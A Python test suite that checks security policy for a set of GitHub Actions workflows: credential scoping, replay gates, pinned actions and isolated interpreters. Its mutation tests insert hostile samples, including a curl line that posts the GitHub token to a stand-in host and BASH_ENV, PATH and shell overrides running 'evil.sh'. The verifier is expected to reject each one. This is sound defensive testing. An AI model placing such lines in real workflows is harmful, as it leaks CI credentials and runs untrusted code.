#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import pathlib
import re
import subprocess
import sys
import unittest


ROOT = pathlib.Path(__file__).resolve().parents[3]
WORKFLOWS = ROOT / ".github/workflows"
CONTROL_PLANE_PATH = ROOT / "automation/control_plane.py"
SPEC = importlib.util.spec_from_file_location(
    "task107_r2_workflow_policy_control_plane", CONTROL_PLANE_PATH
)
if SPEC is None or SPEC.loader is None:
    raise RuntimeError("CONTROL_PLANE_SPEC")
CP = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = CP
SPEC.loader.exec_module(CP)
ACTIVE = {
    "uaart_autostart.yml",
    "uaart_orchestrator.yml",
    "uaart_fast.yml",
    "uaart_standard.yml",
    "uaart_critical.yml",
    "uaart_backup.yml",
    "uaart_maintenance.yml",
    "uaart_monitor.yml",
    "uaart_transaction_watchdog.yml",
}


class WorkflowContractTests(unittest.TestCase):
    def read(self, name: str) -> str:
        return (WORKFLOWS / name).read_text(encoding="utf-8")

    def steps(self, name: str) -> list[str]:
        relative = ".github/workflows/" + name
        return list(CP._named_workflow_step_blocks(self.read(name), relative))

    def jobs(self, name: str) -> dict[str, str]:
        relative = ".github/workflows/" + name
        return dict(CP._workflow_job_blocks(self.read(name), relative))

    def multiline_shell_blocks(self, name: str) -> list[str]:
        lines = self.read(name).splitlines()
        blocks: list[str] = []
        index = 0
        while index < len(lines):
            if not re.fullmatch(r"        run:\s*\|[-+]?\s*", lines[index]):
                index += 1
                continue
            index += 1
            body: list[str] = []
            while index < len(lines):
                line = lines[index]
                if line and len(line) - len(line.lstrip()) <= 8:
                    break
                body.append(line[10:] if line else "")
                index += 1
            blocks.append("\n".join(body) + "\n")
        return blocks

    def test_active_workflow_set_is_exact(self):
        actual = {
            path.name
            for path in WORKFLOWS.iterdir()
            if path.suffix in {".yml", ".yaml"}
        }
        self.assertEqual(actual, ACTIVE)

    def test_job_level_configuration_rejects_runner_context(self):
        for name in sorted(ACTIVE):
            for job_id, job in self.jobs(name).items():
                with self.subTest(name=name, job_id=job_id):
                    header = job.split("\n    steps:", 1)[0]
                    self.assertNotRegex(header, r"\$\{\{\s*runner\.")

    def test_every_multiline_shell_step_parses(self):
        for name in sorted(ACTIVE):
            for index, source in enumerate(self.multiline_shell_blocks(name)):
                with self.subTest(name=name, index=index):
                    result = subprocess.run(
                        ["bash", "-n"],
                        input=source,
                        text=True,
                        capture_output=True,
                        check=False,
                    )
                    self.assertEqual(result.returncode, 0, result.stderr)

    def test_active_workflow_security_policy_passes(self):
        result = CP.verify_production_credential_workflow_policy(root=ROOT)
        self.assertEqual(result["status"], "PASS")
        self.assertEqual(
            set(result["consumers"]),
            {
                ".github/workflows/uaart_critical.yml",
                ".github/workflows/uaart_transaction_watchdog.yml",
            },
        )

    def test_sensitive_workflow_python_startup_is_isolated(self):
        for name in (
            "uaart_autostart.yml",
            "uaart_orchestrator.yml",
            "uaart_fast.yml",
            "uaart_standard.yml",
            "uaart_critical.yml",
            "uaart_backup.yml",
            "uaart_maintenance.yml",
            "uaart_monitor.yml",
            "uaart_transaction_watchdog.yml",
        ):
            with self.subTest(name=name):
                source = self.read(name)
                matches = list(CP.PYTHON_INTERPRETER_RE.finditer(source))
                self.assertTrue(matches)
                for match in matches:
                    self.assertRegex(source[match.end():], r"^\s+-I(?=\s|$)")

    def test_orchestrator_is_exact_and_mode_validated(self):
        value = self.read("uaart_orchestrator.yml")
        jobs = self.jobs("uaart_orchestrator.yml")
        self.assertNotIn("\n  push:", value)
        self.assertNotIn("workflow_dispatch:", value)
        self.assertNotIn("max(task", value.casefold())
        self.assertEqual(
            set(jobs), {"validate", "plan", "fast", "standard", "critical"}
        )
        self.assertIn("group: uaart-intake-main", value)
        self.assertNotRegex(value, r"(?i)github\s*\.\s*ref_name|\bGITHUB_REF_NAME\b")
        self.assertNotRegex(value, r"(?m)^\s*git\s+(?:add|rebase)\b")
        self.assertNotRegex(value, r"(?m)^\s*git\s+commit(?:\s|$)")
        self.assertNotRegex(value, r"\bpush\s+origin\s+[^\n]*\bHEAD(?::|\b)")
        self.assertNotRegex(value, r"\bHEAD\b")
        self.assertIn("control_plane.py verify-mode", value)
        self.assertIn("expected_request_sha256", value)
        self.assertIn("--expected-sha256", value)
        self.assertIn("autostart_ledger_path", value)
        self.assertIn("--autostart-ledger", value)
        self.assertIn("autostart_source_commit", value)
        self.assertIn("--autostart-source-commit", value)
        self.assertIn("control_plane.py claim", value)
        self.assertIn("verify-request", value)
        self.assertIn("request_sha256", value)
        self.assertIn("claim_path", value)
        self.assertIn("UA-ART-INTAKE-ATTESTATION-1", value)
        self.assertIn("runtime_manifest_sha256", value)
        self.assertIn("orchestrator_blob_oid", value)
        self.assertIn("workflow_source_commit", value)
        self.assertIn("UAART_DATA_ONLY_ARTIFACT_VALIDATED", jobs["plan"])
        self.assertIn("actual != ['attestation.json']", jobs["plan"])
        self.assertIn("[a-z0-9_][a-z0-9_-]{0,44}", jobs["plan"])
        self.assertEqual(
            CP._job_contents_permission(
                jobs["validate"],
                ".github/workflows/uaart_orchestrator.yml",
                "validate",
            ),
            "read",
        )
        self.assertEqual(
            CP._job_contents_permission(
                jobs["plan"],
                ".github/workflows/uaart_orchestrator.yml",
                "plan",
            ),
            "write",
        )
        self.assertIsNone(CP.GITHUB_WRITE_CREDENTIAL_RE.search(jobs["validate"]))
        self.assertFalse(CP._task_execution_commands(jobs["validate"]))
        self.assertFalse(CP._task_execution_commands(jobs["plan"]))
        self.assertNotRegex(
            jobs["plan"],
            r"(?m)^\s*(?:(?:/usr/bin/)?python(?:3(?:\.\d+)?)?\s+(?:-I\s+)?)?"
            r"(?:\./)?automation/task_orchestrator\.py(?:\s|$)",
        )
        for job_id in ("validate", "plan", "fast", "standard", "critical"):
            with self.subTest(job_id=job_id):
                header = jobs[job_id].split("\n    steps:", 1)[0]
                self.assertIn("github.ref == 'refs/heads/main'", header)
                self.assertIn("github.run_attempt == 1", header)
        for job_id in ("fast", "standard", "critical"):
            self.assertEqual(
                CP._job_contents_permission(
                    jobs[job_id],
                    ".github/workflows/uaart_orchestrator.yml",
                    job_id,
                ),
                "write",
            )
            self.assertIn("needs: plan", jobs[job_id])

    def test_orchestrator_attestation_and_persist_are_fresh_runner_isolated(self):
        value = self.read("uaart_orchestrator.yml")
        jobs = self.jobs("uaart_orchestrator.yml")
        checkouts = [
            block for block in self.steps("uaart_orchestrator.yml")
            if "uses: actions/checkout@" in block
        ]
        self.assertEqual(len(checkouts), 2)
        for block in checkouts:
            self.assertEqual(block.count("ref: main"), 1)
            self.assertEqual(block.count("clean: true"), 1)
            self.assertEqual(block.count("fetch-depth: 0"), 1)
            self.assertEqual(block.count("persist-credentials: false"), 1)
        downloads = [
            block for block in self.steps("uaart_orchestrator.yml")
            if "uses: actions/download-artifact@" in block
        ]
        self.assertEqual(len(downloads), 1)
        self.assertIn("${{ runner.temp }}/uaart-intake-import", downloads[0])
        token_steps = [
            block for block in self.steps("uaart_orchestrator.yml")
            if "github.token" in block
        ]
        self.assertEqual(len(token_steps), 1)
        persist = token_steps[0]
        self.assertIn("Persist only the exact claim and plan", persist)
        self.assertIn('for path in "$CLAIM_PATH" "$PLAN_PATH"; do', persist)
        self.assertIn('test "${#changed[@]}" -eq 2', persist)
        self.assertIn("GIT_INDEX_FILE", persist)
        self.assertIn("git read-tree", persist)
        self.assertIn("git commit-tree", persist)
        self.assertIn("for attempt in 1 2 3 4 5 6", persist)
        self.assertIn(
            'git merge-base --is-ancestor "$last_commit" "$parent"', persist
        )
        self.assertIn(
            'git merge-base --is-ancestor "$ATTESTED_WORKFLOW_SOURCE_COMMIT" "$parent"',
            persist,
        )
        self.assertIn(
            'git cat-file blob "$parent:state/AUTOPILOT_RUNTIME_MANIFEST.json"',
            persist,
        )
        self.assertIn(
            'git cat-file blob "$parent:$ATTESTED_REQUEST_PATH"', persist
        )
        self.assertIn(
            'git rev-parse "$parent:.github/workflows/uaart_orchestrator.yml"',
            persist,
        )
        self.assertIn("UAART_TRUSTED_RUNTIME_CLOSURE_VALIDATED", persist)
        self.assertIn("INTAKE_RUNTIME_FILE_SET", persist)
        self.assertIn('git_auth push origin "$COMMIT:refs/heads/main"', persist)
        self.assertEqual(value.count("github.token"), 1)
        for job_id, job in jobs.items():
            for block in CP._named_job_step_blocks(
                job, ".github/workflows/uaart_orchestrator.yml", job_id
            ):
                body = CP._step_run_body(
                    block, ".github/workflows/uaart_orchestrator.yml"
                )
                if body is not None:
                    self.assertNotIn("${{", body)
        CP._verify_orchestrator_fresh_runner_policy(
            value, ".github/workflows/uaart_orchestrator.yml"
        )

    def test_orchestrator_policy_rejects_replay_and_binding_regressions(self):
        relative = ".github/workflows/uaart_orchestrator.yml"
        value = self.read("uaart_orchestrator.yml")
        replayed = value.replace(
            "if: github.ref == 'refs/heads/main' && github.run_attempt == 1 && "
            "needs.plan.outputs.task_class == 'CRITICAL'",
            "if: github.ref == 'refs/heads/main' && "
            "needs.plan.outputs.task_class == 'CRITICAL'",
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_JOB_REPLAY_GATE:critical"
        ):
            CP._verify_orchestrator_fresh_runner_policy(replayed, relative)

        unbound_runtime = value.replace(
            'git cat-file blob "$parent:state/AUTOPILOT_RUNTIME_MANIFEST.json"',
            'git cat-file blob "$parent:state/UNBOUND.json"',
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_PRIVILEGED_PERSIST_CONTRACT"
        ):
            CP._verify_orchestrator_fresh_runner_policy(unbound_runtime, relative)

        direct_expression = value.replace(
            'test "$ATTESTED_REQUEST_PATH" = "$REQUEST_PATH"',
            'test "${{ inputs.request_path }}" = "$REQUEST_PATH"',
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_RUN_EXPRESSION_FORBIDDEN"
        ):
            CP._verify_orchestrator_fresh_runner_policy(direct_expression, relative)

        weakened_guard = value.replace(
            "if: github.ref == 'refs/heads/main' && github.run_attempt == 1",
            "if: always() || (github.ref == 'refs/heads/main' && github.run_attempt == 1)",
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_JOB_REPLAY_GATE:validate"
        ):
            CP._verify_orchestrator_fresh_runner_policy(weakened_guard, relative)

        swapped_callee = value.replace(
            "uses: ./.github/workflows/uaart_fast.yml",
            "uses: ./.github/workflows/uaart_critical.yml",
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_ROUTE_CALLEE:fast"
        ):
            CP._verify_orchestrator_fresh_runner_policy(swapped_callee, relative)

        token_alias = value.replace(
            "          GH_TOKEN: ${{ github.token }}",
            "          GH_TOKEN: ${{ github.token }}\n"
            "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}",
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_GITHUB_TOKEN_ALIAS_FORBIDDEN"
        ):
            CP._verify_orchestrator_fresh_runner_policy(token_alias, relative)

        python_before_bootstrap = value.replace(
            '            cd "$rebuild"\n            python3 -I - <<\'PY\'',
            '            cd "$rebuild"\n'
            '            python3 -I automation/control_plane.py verify-mode\n'
            '            python3 -I - <<\'PY\'',
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_RUNTIME_BOOTSTRAP_ORDER"
        ):
            CP._verify_orchestrator_fresh_runner_policy(
                python_before_bootstrap, relative
            )

        command_marker = "            python3 -I automation/control_plane.py verify-mode"
        command_prefix, command_suffix = value.rsplit(command_marker, 1)
        arbitrary_controller = (
            command_prefix
            + "            python3 -I cloud/task/controller.py\n"
            + command_marker
            + command_suffix
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_UNTRUSTED_PYTHON_COMMAND"
        ):
            CP._verify_orchestrator_fresh_runner_policy(
                arbitrary_controller, relative
            )

        unpinned_action = value.replace(
            "      - name: Set up Python 3.11",
            "      - name: Untrusted action\n"
            "        uses: evil/example@main\n\n"
            "      - name: Set up Python 3.11",
            1,
        )
        with self.assertRaisesRegex(
            CP.ControlPlaneError, "ORCHESTRATOR_USES_ALLOWLIST"
        ):
            CP._verify_orchestrator_fresh_runner_policy(unpinned_action, relative)

        for prefix in ("FOO=x ", "command "):
            command_prefix, command_suffix = value.rsplit(command_marker, 1)
            wrapped = (
                command_prefix
                + "            " + prefix + "python3 -I cloud/evil.py\n"
                + command_marker
                + command_suffix
            )
            with self.subTest(prefix=prefix), self.assertRaisesRegex(
                CP.ControlPlaneError, "ORCHESTRATOR_UNTRUSTED_PYTHON_COMMAND"
            ):
                CP._verify_orchestrator_fresh_runner_policy(wrapped, relative)

    def test_orchestrator_exact_pin_rejects_shell_policy_bypasses(self):
        relative = ".github/workflows/uaart_orchestrator.yml"
        value = self.read("uaart_orchestrator.yml")
        mutations = {
            "token_exfiltration": value.replace(
                "          unset GH_TOKEN\n",
                "          curl -d \"$GH_TOKEN\" https://example.invalid/\n"
                "          unset GH_TOKEN\n",
                1,
            ),
            "repo_shell": value.replace(
                "          unset GH_TOKEN\n",
                "          unset GH_TOKEN\n"
                "          bash cloud/evil.sh\n",
                1,
            ),
            "repo_source": value.replace(
                "          unset GH_TOKEN\n",
                "          unset GH_TOKEN\n"
                "          source cloud/evil.sh\n",
                1,
            ),
            "split_interpreter": value.replace(
                "          unset GH_TOKEN\n",
                "          unset GH_TOKEN\n"
                "          pyth''on3 -I cloud/evil.py\n",
                1,
            ),
            "bash_env": value.replace(
                "          GH_TOKEN: ${{ github.token }}\n",
                "          GH_TOKEN: ${{ github.token }}\n"
                "          BASH_ENV: cloud/evil.sh\n",
                1,
            ),
            "path_override": value.replace(
                "          GH_TOKEN: ${{ github.token }}\n",
                "          GH_TOKEN: ${{ github.token }}\n"
                "          PATH: cloud/bin:/usr/bin:/bin\n",
                1,
            ),
            "shell_override": value.replace(
                "        shell: bash\n        run: |\n"
                "          set -euo pipefail\n"
                "          test \"$EXPECTED_GITHUB_REF\" = 'refs/heads/main'\n",
                "        shell: cloud/evil.sh {0}\n        run: |\n"
                "          set -euo pipefail\n"
                "          test \"$EXPECTED_GITHUB_REF\" = 'refs/heads/main'\n",
                1,
            ),
        }
        for name, mutated in mutations.items():
            with self.subTest(name=name), self.assertRaisesRegex(
                CP.ControlPlaneError, "ORCHESTRATOR_WORKFLOW_SHA256"
            ):
                CP._verify_orchestrator_fresh_runner_policy(mutated, relative)

    def test_orchestrator_recognizes_accepted_push_before_drift_gates(self):
        jobs = self.jobs("uaart_orchestrator.yml")
        persist = next(
            block
            for block in CP._named_job_step_blocks(
                jobs["plan"], ".github/workflows/uaart_orchestrator.yml", "plan"
            )
            if "Persist only the exact claim and plan" in block
        )
        accepted = persist.index(
            'git merge-base --is-ancestor "$last_commit" "$parent"'
        )
        for gate in (
            'git merge-base --is-ancestor "$ATTESTED_WORKFLOW_SOURCE_COMMIT" "$parent"',
            'git cat-file blob "$parent:state/AUTOPILOT_RUNTIME_MANIFEST.json"',
            'git cat-file blob "$parent:$ATTESTED_REQUEST_PATH"',
        ):
            with self.subTest(gate=gate):
                self.assertLess(accepted, persist.index(gate))

    def test_global_autostart_is_fresh_exact_marker_only(self):
        value = self.read("uaart_autostart.yml")
        jobs = self.jobs("uaart_autostart.yml")
        self.assertEqual(set(jobs), {"context", "intake", "persist", "execute"})
        self.assertIn("branches:\n      - main", value)
        self.assertIn("tasks/launch/AUTO-*.json", value)
        self.assertIn("git diff --name-only -z", value)
        self.assertIn("--diff-filter=A", value)
        self.assertIn('test "${#changes[@]}" -eq 1', value)
        self.assertIn('test "${#additions[@]}" -eq 1', value)
        self.assertIn("verify-mode --require AUTOMATIC", value)
        self.assertIn("--validate-only", jobs["intake"])
        self.assertNotIn("git add", value)
        self.assertNotRegex(value, r"(?m)^\s*git\s+rebase\b")
        self.assertNotRegex(value, r"\bpush\s+origin\s+[^\n]*\bHEAD(?::|\b)")
        checkout_steps = [
            block for block in self.steps("uaart_autostart.yml")
            if "uses: actions/checkout@" in block
        ]
        self.assertEqual(len(checkout_steps), 2)
        for block in checkout_steps:
            self.assertEqual(block.count("persist-credentials: false"), 1)
        self.assertIn("ref: ${{ github.sha }}", checkout_steps[0])
        self.assertIn("ref: main", checkout_steps[1])
        for job_id in ("intake", "persist", "execute"):
            header = jobs[job_id].split("\n    steps:", 1)[0]
            self.assertIn("github.ref == 'refs/heads/main'", header)
            self.assertIn("github.run_attempt == 1", header)
        for job_id in ("context", "intake", "persist"):
            self.assertIn('test "$GITHUB_RUN_ATTEMPT" = \'1\'', jobs[job_id])
        for block in self.steps("uaart_autostart.yml"):
            body = CP._step_run_body(
                block, ".github/workflows/uaart_autostart.yml"
            )
            if body is not None:
                self.assertNotIn("${{", body)
        persist = [
            block for block in self.steps("uaart_autostart.yml")
            if "github.token" in block
        ]
        self.assertEqual(len(persist), 1)
        persist = persist[0]
        self.assertIn(r"r'[a-z0-9_]+=[^\r\n]+'", persist)
        self.assertNotIn(r"r'[a-z_]+=[^\r\n]+'", persist)
        for marker in (
            "python3 -I \"$TRUSTED_RUNTIME/automation/autostart_intake.py\"",
            "git merge-base --is-ancestor \"$BEFORE_SHA\" \"$SOURCE_COMMIT\"",
            "git merge-base --is-ancestor \"$COMMIT\"",
            "git rev-list --parents -n 1",
            "SOURCE_LAUNCH_ENTRY",
            "PARENT_LAUNCH_ENTRY",
            "UAART_TRUSTED_RUNTIME_CLOSURE_VALIDATED",
            "object_pairs_hook=reject_duplicate_keys",
            "state/schemas/task_request.schema.json",
            "AUTOSTART_SOURCE_RUNTIME_SHA_MISMATCH",
            "--root \"$REBUILD\"",
            "GITHUB_OUTPUT=\"$ATTEMPT_OUTPUTS\"",
            "AUTOSTART_OUTPUT_BINDING",
            "LAST_OUTPUTS=\"$ATTEMPT_OUTPUTS\"",
            "cat \"$LAST_OUTPUTS\" >>\"$GITHUB_OUTPUT\"",
            "^state/autostart_consumed/",
            "^state/autostart_nonces/",
            "GIT_INDEX_FILE",
            "RUNNER_TEMP",
            "git read-tree",
            "git commit-tree",
            "AUTOSTART_COMMIT_PATH_SCOPE",
            "COMMIT:refs/heads/main",
        ):
            self.assertIn(marker, persist)
        self.assertLess(persist.index("unset GH_TOKEN"), persist.index("python3 -I"))
        self.assertEqual(value.count("${{ github.token }}"), 1)
        self.assertIn("uses: ./.github/workflows/uaart_orchestrator.yml", value)
        for binding in (
            "request_path: ${{ needs.persist.outputs.request_path }}",
            "expected_request_sha256: ${{ needs.persist.outputs.request_sha256 }}",
            "autostart_ledger_path: ${{ needs.persist.outputs.ledger_path }}",
            "autostart_source_commit: ${{ github.sha }}",
        ):
            self.assertIn(binding, jobs["execute"])
        CP._verify_autostart_fresh_runner_policy(
            value, ".github/workflows/uaart_autostart.yml"
        )

    def test_nonproduction_rerun_is_failure_only_without_controller(self):
        for name in ("uaart_fast.yml", "uaart_standard.yml"):
            with self.subTest(name=name):
                jobs = self.jobs(name)
                for job_id in ("execute", "persist"):
                    header = jobs[job_id].split("\n    steps:", 1)[0]
                    self.assertIn("github.run_attempt == 1", header)
                    self.assertIn(
                        'test "$GITHUB_RUN_ATTEMPT" = \'1\'', jobs[job_id]
                    )
                failure_header = jobs["persist_failure"].split(
                    "\n    steps:", 1
                )[0]
                self.assertNotIn("github.run_attempt == 1", failure_header)
                self.assertIn("always()", failure_header)
                self.assertIn("control_plane.py fail", jobs["persist_failure"])
                self.assertIn(
                    'if test "$GITHUB_RUN_ATTEMPT" != \'1\'',
                    jobs["persist_failure"],
                )
                self.assertIn(
                    "FAILURE_MODE_ARGS+=(--terminal)",
                    jobs["persist_failure"],
                )
                self.assertIn(
                    '"${FAILURE_MODE_ARGS[@]}"',
                    jobs["persist_failure"],
                )
                self.assertFalse(
                    CP._task_execution_commands(jobs["persist_failure"])
                )

    def test_nonproduction_running_workflow_blob_is_source_bound(self):
        for name in ("uaart_fast.yml", "uaart_standard.yml"):
            with self.subTest(name=name):
                relative = ".github/workflows/" + name
                jobs = self.jobs(name)
                execute = jobs["execute"]
                for marker in (
                    "workflow_blob_oid: ${{ steps.contract.outputs.workflow_blob_oid }}",
                    "workflow_source_commit: ${{ steps.contract.outputs.workflow_source_commit }}",
                    "WORKFLOW_SOURCE_COMMIT: ${{ github.sha }}",
                    "WORKFLOW_PATH: " + relative,
                    "fetch-depth: 0",
                    'git merge-base --is-ancestor "$WORKFLOW_SOURCE_COMMIT" HEAD',
                    '"$WORKFLOW_SOURCE_COMMIT:$WORKFLOW_PATH"',
                    "VALIDATION_WORKFLOW_BLOB_BINDING",
                    'echo "workflow_blob_oid=${WORKFLOW_BLOB_OID}"',
                    'echo "workflow_source_commit=${WORKFLOW_SOURCE_COMMIT}"',
                ):
                    self.assertIn(marker, execute)
                persist = jobs["persist"]
                for marker in (
                    "WORKFLOW_SOURCE_COMMIT: ${{ needs.execute.outputs.workflow_source_commit }}",
                    "WORKFLOW_BLOB_OID: ${{ needs.execute.outputs.workflow_blob_oid }}",
                    'git merge-base --is-ancestor "$WORKFLOW_SOURCE_COMMIT" "$SOURCE_COMMIT"',
                    'git rev-parse "$SOURCE_COMMIT:$WORKFLOW_PATH"',
                    'git rev-parse "$PARENT:$WORKFLOW_PATH"',
                    "ACCEPTED_PATHS",
                    '"${ACCEPTED_PATHS[@]}"',
                    "ACCEPTED_PUSH_OWNED_PATHS_CHANGED",
                    "'workflow_blob_oid'",
                    "'workflow_source_commit'",
                    "ARTIFACT_IMPORT_ROOT_INVALID",
                    "ARTIFACT_DUPLICATE_KEY",
                    "REBUILD_ARTIFACT_DUPLICATE_KEY",
                    "ARTIFACT_SIZE_LIMIT",
                    "ARTIFACT_FILE_SET",
                    "ARTIFACT_TARGET_SYMLINK",
                ):
                    self.assertIn(marker, persist)
                failure = jobs["persist_failure"]
                for marker in (
                    "WORKFLOW_SOURCE_COMMIT: ${{ github.sha }}",
                    "WORKFLOW_PATH: " + relative,
                    'git rev-parse "HEAD:$WORKFLOW_PATH"',
                    'git rev-parse "$PARENT:$WORKFLOW_PATH"',
                    '"$WORKFLOW_SOURCE_COMMIT:$WORKFLOW_PATH"',
                    'git diff --quiet "$COMMIT" refs/remotes/origin/main --',
                    '"$CLAIM_PATH"',
                    "ACCEPTED_PUSH_OWNED_PATHS_CHANGED",
                ):
                    self.assertIn(marker, failure)

    def test_nonproduction_write_jobs_bootstrap_runtime_before_repo_python(self):
        for name in ("uaart_fast.yml", "uaart_standard.yml"):
            with self.subTest(name=name):
                relative = ".github/workflows/" + name
                jobs = self.jobs(name)
                for job_id in ("persist", "persist_failure"):
                    job = jobs[job_id]
                    self.assertGreaterEqual(
                        job.count("UAART_TRUSTED_RUNTIME_CLOSURE_VALIDATED"), 2
                    )
                    repository_python = re.search(
                        r"(?m)^\s*(?:/usr/bin/)?python(?:3(?:\.\d+)?)?\s+-I\s+"
                        r"automation/(?:control_plane|execution_contract)\.py\b",
                        job,
                    )
                    self.assertIsNotNone(repository_python)
                    self.assertLess(
                        job.index("UAART_TRUSTED_RUNTIME_CLOSURE_VALIDATED"),
                        repository_python.start(),
                    )
                    credential_steps = [
                        block
                        for block in CP._named_job_step_blocks(
                            job, relative, job_id
                        )
                        if CP.GITHUB_WRITE_CREDENTIAL_RE.search(block)
                    ]
                    self.assertEqual(len(credential_steps), 1)
                    credential = credential_steps[0]
                    first_python = CP.PYTHON_INTERPRETER_RE.search(credential)
                    self.assertIsNotNone(first_python)
                    self.assertLess(
                        credential.index("unset GH_TOKEN"), first_python.start()
                    )
                failure = jobs["persist_failure"]
                self.assertIn("WORKFLOW_SOURCE_COMMIT", failure)
                self.assertIn("git cat-file blob", failure)
                self.assertIn(
                    'git merge-base --is-ancestor "$WORKFLOW_SOURCE_COMMIT"',
                    failure,
                )

    def test_class_routes_share_safety_contract(self):
        for name in ("uaart_fast.yml", "uaart_standard.yml", "uaart_critical.yml"):
            with self.subTest(name=name):
                value = self.read(name)
                self.assertNotIn("workflow_dispatch:", value)
                self.assertIn("uaart-resource-", value)
                self.assertIn("ua-art-production-writer", value)
                self.assertIn("control_plane.py verify-mode", value)
                self.assertIn("verify-identity", value)
                self.assertIn("control_plane.py storage", value)
                self.assertIn("control_plane.py finish", value)
                checkout_steps = [
                    block for block in self.steps(name)
                    if "uses: actions/checkout@" in block
                ]
                self.assertGreaterEqual(len(checkout_steps), 2)
                for block in checkout_steps:
                    self.assertEqual(block.count("persist-credentials: false"), 1)
                task_jobs = [
                    (job_id, job)
                    for job_id, job in self.jobs(name).items()
                    if CP._task_execution_commands(job)
                ]
                self.assertTrue(task_jobs)
                for job_id, job in task_jobs:
                    self.assertEqual(
                        CP._job_contents_permission(
                            job, ".github/workflows/" + name, job_id
                        ),
                        "read",
                    )
                    self.assertIsNone(CP.GITHUB_WRITE_CREDENTIAL_RE.search(job))
                for job_id, job in self.jobs(name).items():
                    if CP._job_contents_permission(
                        job, ".github/workflows/" + name, job_id
                    ) == "write":
                        self.assertFalse(CP._task_execution_commands(job))
                        self.assertIsNone(
                            CP.PRODUCTION_CREDENTIAL_REFERENCE_RE.search(job)
                        )
        self.assertGreaterEqual(
            self.read("uaart_critical.yml").count("control_plane.py health"), 2
        )

    def test_nonproduction_routes_never_receive_the_real_production_secret(self):
        for name in ("uaart_fast.yml", "uaart_standard.yml"):
            with self.subTest(name=name):
                self.assertNotIn(
                    "secrets.PYTHONANYWHERE_API_TOKEN", self.read(name)
                )
        critical = self.read("uaart_critical.yml")
        self.assertIn(
            "Execute authorized CRITICAL controller without Production credential",
            critical,
        )
        self.assertIn("if: inputs.production_required != 'true'", critical)
        self.assertIn("inputs.production_required == 'true'", critical)
        self.assertEqual(
            len(re.findall(r"secrets\.PYTHONANYWHERE_API_TOKEN", critical)), 3
        )

    def test_production_route_has_backup_transaction_rollback_and_watchdog(self):
        value = self.read("uaart_critical.yml")
        self.assertIn("transaction_watchdog.py assert-clear", value)
        self.assertIn("control_plane.py transaction-prepare", value)
        self.assertIn("execution_contract.py backup", value)
        self.assertIn("execution_contract.py backup-receipt", value)
        self.assertIn("control_plane.py transaction-open", value)
        self.assertIn("control_plane.py transaction-close", value)
        self.assertIn("UAART_TRANSACTION_ID", value)
        self.assertIn("execution_contract.py rollback", value)
        self.assertIn("failure() || cancelled()", value)
        self.assertLess(
            value.index("control_plane.py transaction-prepare"),
            value.index("secrets.PYTHONANYWHERE_API_TOKEN"),
        )
        self.assertIn("steps.backup_open.outputs.opened == 'true'", value)
        open_steps = [
            block for block in self.steps("uaart_critical.yml")
            if "control_plane.py transaction-open" in block
        ]
        self.assertEqual(len(open_steps), 1)
        self.assertLess(open_steps[0].index("push origin"), open_steps[0].index("opened=true"))
        secret_steps = [
            block for block in self.steps("uaart_critical.yml")
            if "secrets.PYTHONANYWHERE_API_TOKEN" in block
        ]
        self.assertEqual(len(secret_steps), 3)
        self.assertEqual(
            {
                marker
                for block in secret_steps
                for marker in (
                    "execution_contract.py backup",
                    "execution_contract.py run",
                    "execution_contract.py rollback",
                )
                if marker in block
            },
            {
                "execution_contract.py backup",
                "execution_contract.py run",
                "execution_contract.py rollback",
            },
        )
        for block in secret_steps:
            self.assertIn("inputs.production_required == 'true'", block)
            self.assertIn("github.run_attempt == 1", block)
            self.assertIn("test \"$GITHUB_RUN_ATTEMPT\" = '1'", block)
            self.assertNotIn("github.token", block)
        watchdog = self.read("uaart_transaction_watchdog.yml")
        self.assertIn("group: ua-art-production-writer", watchdog)
        self.assertNotIn("workflow_dispatch:", watchdog)
        self.assertIn("--require AUTOMATIC", watchdog)
        self.assertIn("--allow-halt-for-recovery", watchdog)
        self.assertIn("transaction_watchdog.py discover", watchdog)
        self.assertIn("transaction_status == 'PREPARING'", watchdog)
        self.assertIn("transaction_status == 'OPEN'", watchdog)
        self.assertIn("execution_contract.py rollback", watchdog)
        self.assertIn("control_plane.py halt", watchdog)
        self.assertIn("control_plane.py halt-system", watchdog)
        self.assertGreaterEqual(watchdog.count("persist-credentials: false"), 2)
        self.assertEqual(
            len(re.findall(r"secrets\.PYTHONANYWHERE_API_TOKEN", watchdog)), 1
        )
        watchdog_secret = [
            block for block in self.steps("uaart_transaction_watchdog.yml")
            if "secrets.PYTHONANYWHERE_API_TOKEN" in block
        ]
        self.assertEqual(len(watchdog_secret), 1)
        self.assertIn("needs.discover.outputs.transaction_status == 'OPEN'", watchdog_secret[0])
        self.assertIn("needs.mark_rollback.outputs.marked == 'true'", watchdog_secret[0])
        self.assertIn("github.run_attempt == 1", watchdog_secret[0])
        self.assertNotIn("github.token", watchdog_secret[0])

    def test_critical_runtime_dependency_and_workflow_identity_are_bound(self):
        jobs = self.jobs("uaart_critical.yml")
        validate = jobs["validate"]
        for marker in (
            "dependency_sha256: ${{ steps.contract.outputs.dependency_sha256 }}",
            "runtime_manifest_sha256: ${{ steps.attestation.outputs.runtime_manifest_sha256 }}",
            "workflow_blob_oid: ${{ steps.workflow.outputs.workflow_blob_oid }}",
            "workflow_source_commit: ${{ steps.workflow.outputs.workflow_source_commit }}",
            "Bind executing CRITICAL workflow to checked runtime",
            "VALIDATION_WORKFLOW_BLOB_BINDING",
            "UAART_CRITICAL_VALIDATION_RUNTIME_CLOSURE_VALIDATED",
            "CRITICAL_VALIDATION_RUNTIME_FILE_SET",
        ):
            self.assertIn(marker, self.read("uaart_critical.yml"))
        full_runtime_guard = (
            'git diff --quiet "$WORKFLOW_SOURCE_COMMIT" HEAD -- "${runtime_paths[@]}"'
        )
        for job_id in (
            "prepare", "backup", "open", "controller_production",
            "controller_nonproduction", "finalize",
        ):
            self.assertIn(full_runtime_guard, jobs[job_id])
